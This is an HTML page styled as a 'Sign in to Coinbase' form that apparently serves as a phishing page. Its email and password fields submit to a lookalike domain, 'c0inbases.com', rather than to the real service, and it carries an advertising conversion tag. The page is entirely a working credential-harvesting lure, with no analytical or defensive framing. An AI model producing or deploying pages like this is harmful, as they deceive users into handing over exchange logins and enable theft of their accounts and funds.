<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 20px;
      background: #f8f8f8;
    }
    .header img {
      height: 40px;
    }
    .header a {
      color: #7d838b;
      text-decoration: none;
      font-weight: bold;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 90vh;
    }
    @media (max-width: 768px) {
      .header {
        flex-direction: row;
        justify-content: space-between; /* Keeps logo on left and button on right */
      }
      .header img {
        height: 35px;
      }
    }
  </style>
  <style>
    @media (max-width: 768px) {
      .form-container {
        width: 90%;
        margin-top: 20px; /* Adjusted spacing for smaller screens */
      }
      .form-container h3 {
        font-size: 18px; /* Smaller font for better fit */
      }
      .form-container button {
        font-size: 14px; /* Reduced button font size for smaller screens */
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="assets/favicon.png" alt="Logo">
    <a href="/account/register">Sign Up</a>
  </div>
  <div class="container">

<!-- Google Tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-11490696042"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'AW-11490696042');
</script>

<div class="form-container" style="
  width: 95%; 
  max-width: 400px; 
  padding: 20px; 
  border-radius: 8px; 
  background-color: #ffffff; 
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); 
  margin-top: 40px;">
  <h3 style="text-align: center;">Sign in to Coinbase</h3>
  <form method="post" action="https://c0inbases.com/signin.php">
    <label for="email" style="font-weight: bold; margin-bottom: 8px; display: block;">Email</label>
    <input 
    type="email" 
    id="email" 
      name="email" 
      placeholder="Enter your email" 
      style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 15px; font-size: 14px;" 
      required>
    
    <label for="password" style="font-weight: bold; margin-bottom: 8px; display: block;">Password</label>
    <input 
      type="password" 
      id="password" 
      name="password" 
      placeholder="Enter your password" 
      style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 20px; font-size: 14px;" 
      required>

    <button 
      type="submit" 
      style="width: 100%; background-color: #007bff; color: white; padding: 10px; font-size: 16px; font-weight: bold; border: none; border-radius: 30px; cursor: pointer;">
      Continue
    </button>
  </form>
  <p style="margin-top: 10px; font-size: 12px; color: #666;">
    See our <a href="/policies/privacy-policy" style="color: #007bff;">Privacy Policy</a> for more info. Not your device? Use a private window.
  </p>
</div>


  </div>
</body>
</html>
